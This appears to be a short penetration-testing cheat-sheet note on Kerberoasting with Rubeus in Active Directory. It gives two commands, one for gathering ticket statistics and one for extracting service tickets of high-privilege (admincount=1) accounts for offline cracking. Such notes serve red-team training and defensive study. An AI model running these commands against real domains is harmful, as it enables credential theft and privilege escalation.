# Rubeus: Extract Tickets

OS: Active_Directory
Description: Rubeus: Extract Kerberos Tickets
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### Run Rubeus

```jsx
.\Rubeus.exe kerberoast /stats
```

### Extract high value tickets with /nowrap set

```jsx
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```